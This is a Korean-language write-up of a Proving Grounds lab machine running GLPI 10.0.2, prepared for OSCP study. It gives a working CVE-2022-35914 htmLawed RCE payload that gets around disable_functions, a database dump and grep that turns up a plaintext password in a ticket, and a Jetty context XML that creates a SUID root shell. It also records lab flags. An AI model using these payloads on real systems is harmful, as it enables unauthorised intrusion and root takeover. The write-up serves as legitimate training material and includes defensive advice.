---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/rce
  - tech/cve
  - tech/db/mysql
  - tech/creds/reuse
  - tech/priv/service-as-root
type: machine
platform: pg
os: linux
status: solved
manual_tags: true
cves: [CVE-2022-35914]
manual_cves: true
---
# GLPI

> [!info] 상단 요약
> 타겟 `192.168.248.242` · Ubuntu 20.04.5 · **Fundamental** · 플래그 2개
> 80/GLPI 10.0.2 → **CVE-2022-35914**(번들 htmLawed 테스트 페이지 RCE)로 `www-data` → DB 접근 → 헬프데스크 **티켓 본문의 평문 비번**으로 `betty` SSH → **root 로 뜬 Jetty** 의 webapps 에 betty 가 쓰기 가능 → context XML 투하로 root.

## 0. 이 박스에서 배우는 것

- **번들 서드파티 컴포넌트가 진짜 취약점임.** GLPI 본체가 아니라 `vendor/` 아래 htmLawed 1.2.6 의 테스트 페이지가 인증 없이 노출돼 RCE 발생. 애플리케이션 버전만 보고 판단하면 놓침.
- **`disable_functions` 우회 — 함수 하나 막혔다고 "PoC 가 안 먹는다"로 접지 말 것.** `exec` 만 막혀 있고 `system` 은 열려 있었음. 콜백 체인으로 열린 함수로 갈아탐.
- **자격증명은 인증 DB 가 아니라 애플리케이션 데이터에 있을 수 있음.** bcrypt 해시를 깨는 대신 헬프데스크 티켓 본문의 평문 비번이 정답. GLPI/Zammad/osTicket 류를 만나면 **티켓·KB·followup 테이블부터 grep**.
- **root 로 도는 서비스의 배포 디렉터리에 쓸 수 있으면 그게 권한상승임.** Jetty(root) 의 `webapps/` 에 저권한 유저가 쓸 수 있으면 → context XML 투하만으로 Jetty 가 root 로 실행. 소유자일 필요 없음, 쓰기만 되면 됨.
- **시험 출제 가능성**: htmLawed RCE 자체는 특정 CVE 라 그대로는 안 나옴. 다만 "번들 컴포넌트 노출 → RCE", "앱 데이터에서 평문 크레덴셜 회수", "root 서비스의 쓰기가능 배포 경로"는 전부 전형적 OSCP 패턴.

## 1. 정찰

### Nmap

출처: `~/PG/GLPI/nmap.log`

```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Authentication - GLPI
```

포트 두 개뿐, 나머지 65533 개는 `filtered`. **리다이렉트도 vhost 요구도 없음** — IP 로 바로 치면 `HTTP/1.1 200 OK` 에 GLPI 로그인 화면이 그대로 옴(출처: `~/PG/GLPI/head_80.txt`). `/etc/hosts` 손질 불필요. UDP 경로도 불필요.

### 서비스 식별 — GLPI 버전을 독립 근거 2개로

배너 하나만 믿지 않고 두 신호를 교차:

- `/CHANGELOG.md` 의 첫 버전 항목 `## [10.0.2] unreleased` (출처: `~/PG/GLPI/resp_CHANGELOG.md` 6행. 바로 아래가 `## [10.0.1] 2022-06-02` 라 10.0.2 가 설치된 최신 항목)
- `/vendor/htmlawed/htmlawed/htmLawedTest.php` 가 "htmLawed 1.2.6 test page" 를 렌더 — **번들된 취약 모듈 자체**

NVD 의 영향 범위 표기는 "GLPI through 10.0.2". 10.0.2 이하 전체가 htmLawed 테스트 페이지를 웹루트에 방치했고 그게 CVE-2022-35914.

![[PG-GLPI-login.png]]

GLPI 로그인 화면(`http://192.168.248.242/`). 하단 저작권 `2015-2022 Teclib'` 로 10.0.x 대와 모순 없음.

![[PG-GLPI-htmlawed-testpage.png]]

`/vendor/htmlawed/htmlawed/htmLawedTest.php` 를 인증 없이 그냥 연 화면. 좌상단 `htmLawed 1.2.6 TEST` 가 위 두 번째 버전 근거. 아직 아무것도 제출하지 않은 상태.

## 2. 취약점 분석 — CVE-2022-35914

### 배경

htmLawed 는 HTML 정제 라이브러리. 배포판에 딸려오는 `htmLawedTest.php` 는 정제 규칙을 시험해보라고 만든 **데모 페이지**인데, `hook` 파라미터로 임의 PHP 함수를 콜백처럼 지정할 수 있게 돼 있었음. GLPI 가 이 파일을 웹 접근 가능한 `vendor/` 아래 그대로 배포 → 인증 없는 RCE.

### 왜 취약한가 / 왜 이 페이로드인가

공개 PoC 의 통상 형태:

```
POST /vendor/htmlawed/htmlawed/htmLawedTest.php
Cookie: sid=foo
sid=foo&hhook=exec&text=<cmd>
```

**이 박스에서는 이게 안 먹힘.** 응답 본문은 정상 페이지가 통째로 돌아오고 입력도 처리되지만(입력 hexdump 표시) 명령 출력이 없고 `sleep` 에 타이밍 지연도 없음. 응답 HTML 의 `</form>` 뒤 출력 구간이 통째로 빔 — `poc_id.html`·`m_id.html`·`m_sleep.html`·`phpinfo.html`·`passwd_raw.html` 전부 같은 모양. 원인은 PHP 설정:

출처: `~/PG/GLPI/disable_functions.txt`
```
disable_functions = exec,pcntl_alarm,pcntl_fork,... (exec disabled; system/passthru/shell_exec NOT disabled)
```

이 파일은 작업 중 한 줄로 줄여 적은 요약이고 `php.ini` 원문 출력은 안 남김 — 목록의 나머지(`...` 부분)는 복원 불가 [관측 없음].

`exec` 는 막힘. 그러나 `system`·`passthru`·`shell_exec` 는 목록에 없음 — **살아 있음.** 그래서 막힌 `exec` 대신 열린 `system` 으로 갈아타는 콜백 체인을 씀.

작동한 페이로드(출처: `~/PG/GLPI/rce.sh`):

```
POST /vendor/htmlawed/htmlawed/htmLawedTest.php   Cookie: sid=foo
text=call_user_func&hhook=array_map&hfoo=system&spec[0]=&spec[1]=<CMD>&sid=foo
```

페이로드를 조각내면:

- htmLawed 는 `hook` 이 지정한 함수를 `hook($text, $C, $S)` 형태로 호출. `hhook=array_map` 이므로 실제로 도는 것은 `array_map($text, $C, $S)` = `array_map('call_user_func', $C, $S)`.
- `$C` = `['array_map','system']` (hhook, hfoo 에서), `$S` = `[null, '<CMD>']` (spec[0], spec[1] 에서).
- `array_map` 이 두 배열을 병렬로 훑음:
  - 1회차 `call_user_func('array_map', null)` — 무해
  - **2회차 `call_user_func('system', '<CMD>')`** — 명령 실행
- `exec` 를 안 거치고 `system` 만 타므로 `disable_functions` 우회.

출력은 응답 HTML 의 마지막 `</form>` 뒤에 그대로 echo 됨. `rce.sh` 가 그 구간을 정규식으로 잘라 unescape. 첫 성공 응답이 `~/PG/GLPI/am_id.html` 이고 그 구간에 `uid=33(www-data) gid=33(www-data) groups=33(www-data)` 가 들어 있음.

**RCE 성공 직후의 화면은 촬영되지 않았음** [관측 없음]. Kali 에 `shot_rce_success.png` 라는 이름의 파일이 있으나 `shot_htmlawed.png` 와 md5 동일(둘 다 `5b8b79b3…`, 62837바이트) — §1 의 테스트 페이지 화면이 두 이름으로 저장돼 있었을 뿐. 명령 실행의 증거로 남은 것은 응답 HTML 뿐.

## 3. Foothold

`rce.sh <cmd>` 한 방으로 명령 투척:

```bash
./rce.sh 'id'
# → uid=33(www-data) gid=33(www-data) groups=33(www-data)   (응답 원문: am_id.html)
```

이 시점은 **웹 RCE 라 대화형 셸이 아님.** OSCP 규정상 웹셸로 읽은 플래그는 0점이므로 여기서 플래그를 읽고 끝내면 안 됨 — 진짜 셸(betty SSH)까지 가야 함.

### www-data 로 무엇이 보이는가

GLPI 의 DB 설정 파일에서 DB 자격증명 확보.

출처: `~/PG/GLPI/config_db.txt` (`/var/www/glpi/config/config_db.php`)
```php
public $dbuser = 'glpi';
public $dbpassword = 'glpi_db_password';
public $dbdefault = 'glpi';
```

`glpi_users` 를 덤프하면 betty 의 bcrypt 해시가 나옴:

```
7  betty  $2y$10$jG8/feTYsguxsnBqRG6.judCDSNHY4it8SgBTAHig9pMkfmMl9CFa  berta
```

여기서 이 해시를 rockyou 로 깨려는 것이 **함정**(6장 참고). betty 의 비번은 DB 의 다른 곳에 평문으로 있음.

## 4. betty 되기 — 티켓 본문의 평문 비번

bcrypt(cost 10) + rockyou 는 Fundamental 난이도(포털 표시 860명 풀이)에 안 맞음. 대중적 난이도에 브루트포스가 정답처럼 보이면 대개 우리가 못 본 벡터의 신호. GLPI 는 **헬프데스크**이므로 티켓 데이터를 뒤짐.

전체 DB 를 덤프해 크레덴셜 문자열 grep:

```bash
./rce.sh 'mysqldump -uglpi -pglpi_db_password glpi > /tmp/.g.sql; \
  grep -aoiE ".{120}(password|passwd|betty|ssh).{160}" /tmp/.g.sql'
```

`glpi_tickets` id 1 "Password Lost" — betty 가 관리자 Lucas 에게 "Jetty 배포를 끝내야 하니 비번을 새로 달라"고 요청. 그 답이 `glpi_itilfollowups` id 1 에 평문으로 존재:

출처: `~/PG/GLPI/ticket_dump.txt`
```
content: <p>Hello Betty,</p>
<p>i changed your password to : SnowboardSkateboardRoller234</p>
<p>Please change it again as soon as you can.</p>
```

SSH 접속:

```bash
sshpass -p SnowboardSkateboardRoller234 ssh betty@192.168.248.242
```

대화형 셸에서 user 플래그를 증거 형식으로 읽음. 아래는 `~/PG/GLPI/proof_user.txt` 전문 그대로 — 출력을 그대로 리다이렉트한 것이라 파일에 프롬프트는 남지 않았고, 둘째 줄이 작업 중 적어둔 명령 줄:

```
=== user proof ===
whoami; id; hostname; hostname -I; date; cat /home/betty/local.txt
betty
uid=1000(betty) gid=1000(betty) groups=1000(betty)
glpi
192.168.248.242
Thu 20 Aug 2026 11:16:10 PM UTC
6d03f563ffa6d429d2c5f682d84f3d20
```

## 5. 권한상승 — root 로 뜬 Jetty 의 배포 디렉터리

### 열거로 무엇을 발견했는가

betty SSH 셸에서 `harvest.sh` 를 한 번 실행. 발췌(출처: `~/PG/GLPI/harvest_betty.txt` — 실제로 돌아간 시각과 권한은 §5 끝에 적음):

```
===== LISTEN =====
tcp    LISTEN  0       50             0.0.0.0:8080         0.0.0.0:*

===== PROCS =====
root        1260  0.1  4.2 3062996 86124 ?  Sl  22:48  0:02 /usr/bin/java -Djava.io.tmpdir=/tmp
  -Djetty.home=/opt/jetty -Djetty.base=/opt/jetty/jetty-base --class-path /opt/jetty/jetty-base/resources:
  ...:/opt/jetty/lib/jetty-deploy-11.0.12.jar org.eclipse.jetty.xml.XmlConfiguration ...

===== WRITABLE =====
/opt/jetty/jetty-base/webapps
```

두 사실이 겹침 — **Jetty 11.0.12 프로세스가 root 로 돎**(`ps auxf` 의 첫 컬럼), 그리고 **그 Jetty 의 `webapps/` 가 betty 로 쓰기 가능**. 뒤엣것의 근거는 `harvest.sh` 의 `find / -writable -type d` 결과에 그 경로가 실려 있는 것. 디렉터리 **소유자**가 누구인지는 이 산출물로 확인 불가 [관측 없음]. 권한상승 조건은 소유가 아니라 쓰기이므로 여기서는 그것으로 충분.

### 왜 그것이 권한상승이 되는가

Jetty 의 배포 스캐너(DeploymentManager)는 `webapps/` 를 주기적으로 훑어 새로 나타난 `.war` 나 **context XML 디스크립터**를 자동 배포. context XML 은 `Configure` 요소로 임의 Java 객체를 생성·호출할 수 있으므로, `java.lang.Runtime.exec` 를 부르는 XML 을 떨구면 Jetty 가 **root 권한으로** 그 명령을 실행.

떨군 디스크립터(출처: `~/PG/GLPI/root.xml`):

```xml
<Configure class="org.eclipse.jetty.server.handler.ContextHandler">
  <Call class="java.lang.Runtime" name="getRuntime">
    <Call name="exec">
      <Arg><Array type="String">
        <Item>/bin/bash</Item>
        <Item>-c</Item>
        <Item>cp /bin/bash /tmp/rootbash;chmod 4755 /tmp/rootbash</Item>
      </Array></Arg>
    </Call>
  </Call>
</Configure>
```

betty 로 배포하고 스캔 대기:

```bash
scp root.xml betty@192.168.248.242:/opt/jetty/jetty-base/webapps/root.xml
```

배포에서 SUID 파일 생성까지 몇 초. 정확한 대기 시간은 재보지 않았으나 `/tmp/rootbash` 의 mtime 이 `23:17`, root 플래그를 읽은 시각이 `23:17:47` 이라 1분 안쪽. 결과는 나중에 돌린 harvest 에도 그대로 찍혀 있음(출처: `~/PG/GLPI/harvest_betty.txt`, `===== TMP =====`):

```
-rwsr-xr-x  1 root  root  1183448 Aug 20 23:17 rootbash
```

SUID root bash 확보. `-p` 로 유효 UID 를 유지한 채 실행(출처: `~/PG/GLPI/proof_root.txt`, 첫 줄은 작업 중 적어둔 명령 줄):

```
=== root proof ===
/tmp/rootbash -p -c whoami;id;hostname;hostname -I;date;cat /root/proof.txt
root
uid=1000(betty) gid=1000(betty) euid=0(root) groups=1000(betty)
glpi
192.168.248.242
Thu 20 Aug 2026 11:17:47 PM UTC
/root/proof.txt
cbd9b70cece6cc1034f38803d1716d1e
```

`euid=0(root)` — SUID 비트라 real UID 는 betty 지만 유효 UID 는 root. 이 상태로 `/root/proof.txt` 를 읽음.

### `-p` 를 넘기고도 권한을 잃는 곳 — 이 박스가 실제로 걸림

harvest 는 이 박스에서 **딱 한 번** 돌았고 그 한 번이 root 를 잡은 **뒤**였음. 파일 안 `===== DATE =====` 가 `23:18:48`, root 플래그가 `23:17:47`. 그런데도 수집 내용은 전부 betty 수준 — `===== WHOAMI =====` 가 `uid=1000(betty) gid=1000(betty) groups=1000(betty)` 이고 `euid=0` 이 안 붙음.

원인은 harvest 를 띄운 방식. 같은 파일의 `===== PROCS =====` 에 그 프로세스가 남아 있음:

```
root  3356  0.0  0.1  6892  3224 pts/0  S+  23:18  0:00  \_ /tmp/rootbash -p -c sh /tmp/.h.sh > /tmp/.hv.txt 2>&1; wc -l /tmp/.hv.txt
```

`rootbash -p` 까지는 root(`ps` 의 USER 컬럼이 `root`). 그 다음 `sh /tmp/.h.sh` 로 넘기는 순간 권한이 빠짐. Ubuntu 의 `/bin/sh` 는 dash 이고, **dash 는 시작할 때 euid ≠ ruid 면(그리고 `-p` 가 없으면) euid 를 ruid 로 되돌림.** Kali 에서 SUID `bash` 사본으로 재현 — `-p -c 'id'` 는 `euid=0(root)`, `-p -c 'sh -c id'` 는 `euid=0` 소실. `bash -c` 로 넘겨도(`-p` 없이) 동일.

⚠️ 이 재현을 `/tmp` 에서 하면 두 경우 다 `euid=0` 이 안 나와 "설명이 틀렸나"로 헛짚기 쉬움. Kali 의 `/tmp` 가 `nosuid` 로 마운트돼 있어(`findmnt -no OPTIONS /tmp` → `rw,nosuid,nodev,…`) SUID 비트가 아예 무시되기 때문. **홈 디렉터리에서 할 것.**

그래서 이 박스에는 **root 권한 열거 기록이 하나도 없음** [관측 없음]. `/etc/shadow` 는 harvest 의 `-- shadow (읽히면) --` 아래가 비어 있고, `===== FLAGS =====` 에는 `/home/betty/local.txt` 만 있음. root 크론·root 프로세스 환경도 마찬가지. 셸 획득 직후에 돌렸어야 할 **user 단계 harvest 도 없음** — 남은 harvest 는 이 한 개뿐이고 박스는 이미 정지돼 다시 걷을 수 없음.

Jetty 를 발견한 열거 자체의 출력도 파일로 안 남음 [관측 없음]. `root.xml` 이 Kali 에 만들어진 시각이 `23:06:31` 인데 betty 의 비번을 찾아낸 `ticket_dump.txt` 는 `23:15:45` — **www-data 단계에서 이미 Jetty 를 보고 페이로드를 준비해 둔 것**이고, 그때 친 `ps`·`ls` 의 출력은 저장되지 않음. 위의 harvest 발췌는 그 발견을 사후에 뒷받침하는 기록이지 발견 당시의 기록이 아님.

## 5b. 플래그

| | 위치 | 값 |
|---|---|---|
| user | `/home/betty/local.txt` (`-r--r----- betty:betty`, betty 없이는 못 읽음) | `6d03f563ffa6d429d2c5f682d84f3d20` |
| root | `/root/proof.txt` | `cbd9b70cece6cc1034f38803d1716d1e` |

## 6. 막혔던 지점 / 시행착오

이 박스의 시간은 **betty 비번을 어디서 찾느냐**에서 갈림. 인계 시점에는 bcrypt 를 rockyou 로 돌린 채 그 앞에서 대기하다 멈춰 있는 상태였음(경과 시간은 기록에 없음 [관측 없음]). 헛짚은 경로를 우선순위대로 지운 기록:

- **bcrypt 크래킹 (막다른 길).** `john betty.hash --wordlist=rockyou --format=bcrypt`. 안 깨짐. cost 10 bcrypt + 1400만 워드는 Fundamental 난이도에 안 맞음. **대중적 난이도에 브루트포스가 정답처럼 보이면 우리가 못 본 벡터의 신호** — 실제로 평문이 티켓에 있었음.
- **SSH 자격증명 재사용 (실패).** `glpi_db_password`·`betty`·`berta`·`glpi`·`password`·`Betty2023` 를 betty SSH 에 전부 시도, 전부 "Permission denied"(출처: `ssh_reuse.txt`). 가장 싼 시도라 먼저 했지만 이 박스에선 불발.
- **GLPI 암호화 크레덴셜 저장소 (실패, 인계 가설 #2 반증).** 인계 문서가 "가장 유망"으로 본 경로 — GLPI 가 LDAP 바인드/메일수집기 비번을 `glpicrypt.key` 로 대칭 암호화해 저장한다는 것. 키(`/var/www/glpi/config/glpicrypt.key`)는 www-data 로 읽혔으나 **복호화할 암호문 자체가 없었음.** `glpi_authldaps.rootdn_passwd`·`glpi_mailcollectors.passwd`·`glpi_configs` 의 `smtp_passwd`/`proxy_passwd` 전부 빈 값. 이 박스에 암호화 크레덴셜은 애초에 부재.
- **betty 홈 readable 파일 (없음).** `.bash_history` 는 `/dev/null` 심볼릭 링크, `.ssh/` 디렉터리 없음(출처: `sweep1.txt`).
- **GLPI 세션/로그 (부수 정보만).** `files/_sessions/` 의 세션 파일은 UI 선호도만, `event.log` 는 betty 로그인 기록(IP `192.168.56.1`)만. 크레덴셜 없음.
- **전체 DB 덤프 + grep (정답).** `mysqldump` 후 password 문자열 grep. `glpi_itilfollowups` 의 티켓 followup 본문에 평문 비번. **인증 DB(bcrypt)와 애플리케이션 데이터(평문)는 별개** — Wheels 의 "저장소 이원화"와 같은 교훈.

RCE 페이로드 쪽에서도 한 차례 헤맴. `hhook=exec` 계열을 순차로 스무 번 가까이 투척, 응답은 전부 정상 페이지였지만 출력 구간이 비어 있었음 — `~/PG/GLPI/` 에 `poc_id.html`·`m_id.html`·`m_sleep.html`·`mphp.html`·`mtag.html`·`t1~t3.html`·`phpinfo.html`·`passwd_raw.html`·`out_matched.html` 로 그 실패가 전부 남아 있음. 첫 시도 `rce_a.html`(22:52:00 UTC)부터 성공한 `am_id.html`(23:01:41 UTC)까지 **9분 41초** 소모. 후보 함수 목록은 유한하므로 하나씩 보내고 응답을 볼 것이 아니라 `for p in exec system passthru shell_exec popen proc_open` 으로 한 번에 쏘고 응답을 diff 했어야 함. 0바이트로 남은 `htmLawed_src.php`(22:53 UTC)도 같은 구간의 기록 — 테스트 페이지의 PHP 원본을 받아보려다 빈 응답을 받았다는 뜻.

**권한을 잡고도 열거를 betty 로 함.** `/tmp/rootbash -p -c "sh /tmp/.h.sh"` 로 harvest 를 돌려 euid 가 dash 에서 날아갔고(§5 끝), 그 결과 `/etc/shadow`·root 크론 같은 root 전용 정보를 하나도 못 걷은 채 박스를 정지시킴. 다시 걷을 방법 없음. **SUID 셸로 스크립트를 돌릴 거면 `sh script.sh` 가 아니라 `bash -p script.sh` 로 넘기거나, 스크립트 안에서 먼저 `id` 를 찍어 euid 를 확인할 것.**

리버스셸은 미시도 — betty SSH 로 정식 대화형 셸이 열려 웹 RCE 를 리버스셸로 승격할 이유가 없었음. 참고로 앞선 시도에서 443 에 `nc` 리스너를 띄웠으나 connect-back 이 안 붙은 채 남아 있었음(정리함). 이 박스의 아웃바운드 egress 제약 여부는 **확인하지 않았음** [관측 없음].

## 7. OSCP 시험 관점

1. **번들 서드파티 컴포넌트를 열거할 것.** 앱 버전이 최신이어도 `vendor/`·`node_modules/`·`/plugins/` 아래 데모·테스트 페이지가 웹에서 접근 가능하면 그게 진입점. GLPI 를 보면 `/vendor/htmlawed/htmlawed/htmLawedTest.php` 를 먼저 때릴 것.
2. **`disable_functions` 로 함수 하나가 막혔다고 접지 말 것.** `exec` 가 막혀도 `system`·`passthru`·`shell_exec`·`popen`·`proc_open` 중 하나는 대개 열려 있음. PHP RCE 가 "응답은 오는데 출력이 없다"면 disable_functions 를 의심하고 다른 함수로 갈아탈 것. `system` 을 콜백으로 우회하는 `array_map`→`call_user_func` 체인이 이 박스의 수동 대안 그 자체(자동 도구 아님).
3. **헬프데스크·티켓 시스템을 만나면 DB 를 통째로 grep 할 것.** `mysqldump` 후 `grep -i password`. 티켓·KB·followup·메모 본문에 평문 크레덴셜이 흔함. bcrypt 해시를 붙잡고 rockyou 를 돌리기 전에 이것부터.
4. **셸을 잡자마자: `id` · `sudo -l` · `find / -perm -4000` · `getcap -r /` · `ps aux`(누가 root 로 도는가) · `ss -lntp`(내부 리슨 서비스).** 이 박스는 `ps`(Jetty=root) + `find / -writable -type d`(webapps 쓰기 가능)의 교집합이 답이었음.
5. **root 로 도는 서비스의 쓰기가능 경로 = 권한상승.** Jetty(webapps context XML), Tomcat(webapps WAR), cron(스크립트), systemd(unit 파일) 전부 같은 부류. "root 프로세스가 읽거나 실행하는 파일을 내가 쓸 수 있나"를 항상 물을 것.
6. **SUID 셸 안에서 `sh` 로 갈아타면 그 자리에서 root 를 잃음.** dash 는 시작할 때 euid 를 ruid 로 되돌림. `bash` 도 `-p` 없이는 동일. 시험에서는 root 를 잡은 직후가 증거를 걷을 유일한 창이므로, `rootbash -p` 로 연 셸에서 **`id` 를 한 번 찍어 `euid=0` 을 확인한 다음** 열거 스크립트를 돌릴 것. 스크립트를 넘길 때는 `sh x.sh` 가 아니라 `bash -p x.sh`.
7. **시간 배분.** betty 비번 찾기의 손절 기준은 명확했음 — SSH 재사용·암호화 저장소·홈 파일을 15분 안에 지우고 **DB 전체 grep 으로 넘어갈 것.** bcrypt 크래킹은 백그라운드에 걸어두되 거기서 대기하지 말 것(앞선 시도가 여기서 멈췄음).

## 8. 방어 관점

- htmLawed 테스트 페이지 같은 데모·디버그 파일을 프로덕션 배포에서 제거하거나 웹루트 밖으로 뺄 것. GLPI 는 10.0.3 에서 수정(NVD 기준 fixed version).
- 평문 비밀번호를 티켓·채팅에 남기지 말 것. 비번 재설정은 유저가 스스로 하는 원타임 링크로.
- 애플리케이션 서비스(Jetty/Tomcat)를 전용 저권한 계정으로 실행하고, 배포 디렉터리의 소유·쓰기 권한을 그 계정으로 엄격히 제한할 것. 여기서는 Jetty 가 root 로 돈 것과 webapps 가 일반 유저에게 쓰기 가능했던 것 둘 다 잘못.
- DB 계정(`glpi`)에 최소 권한만 부여하고, 웹 프로세스에서 임의 명령 실행이 가능한 경로(disable_functions 미비)를 닫을 것.

## 9. 참고 자료

- CVE-2022-35914 — GLPI htmLawed `htmLawedTest.php` RCE (GLPI ≤ 10.0.2)
- Jetty context XML deploy → RCE: `Configure` + `java.lang.Runtime.exec`
- 관련 패턴: "버전 판정은 독립 근거 2개" — [[Hub]] · [[Levram]]. "저장소 이원화 / 인증 DB ≠ 앱 데이터" — [[Wheels]].

## 남긴 흔적 / 관련 노트

- 타겟: `/opt/jetty/jetty-base/webapps/root.xml` 삭제(자동 언디플로이), `/tmp/rootbash` 삭제, `/tmp/.g.sql`·harvest 임시파일(`/tmp/.h`·`/tmp/.h.sh`·`/tmp/.hv.txt`) 삭제. 만든 계정·바꾼 설정 없음.
  ⚠️ **이 정리는 betty SSH 세션에서 눈으로 확인한 것이고 파일로 안 찍어둠** — `/tmp/rootbash` 없음, `/opt/jetty/jetty-base/webapps/` 비어 있음까지 봤으나 그 화면의 산출물 근거는 없음 [관측 없음]. 박스가 정지돼 다시 찍을 수도 없음. 다음부터는 정리 직후 `ls -la` 출력을 파일로 떨어뜨릴 것.
- Kali: 앞선 시도가 남긴 nc:443 리스너·john 프로세스·좀비 watcher 를 PID 특정해 종료, tmux 세션 `glpibetty`/`glpinmap`/`glpish` 를 이름으로 종료(tmux 서버 비었음).
- 산출물: `~/PG/GLPI/` 52개 (proof_user.txt·proof_root.txt·rce.sh·root.xml·ticket_dump.txt·harvest_betty.txt·disable_functions.txt·실패 응답 HTML 포함).
- 스크린샷은 2종뿐 — GLPI 로그인 화면과 htmLawed 테스트 페이지. Kali 의 `shot_rce_success.png` 는 `shot_htmlawed.png` 의 사본이었고, 볼트로 옮길 때 같은 두 이미지가 네 이름으로 늘어나 있었음. 오도하는 사본 두 개(`PG-GLPI-glpi-login.png`·`PG-GLPI-htmlawed-rce.png`)는 `03. PG\_backup\` 으로 이동.
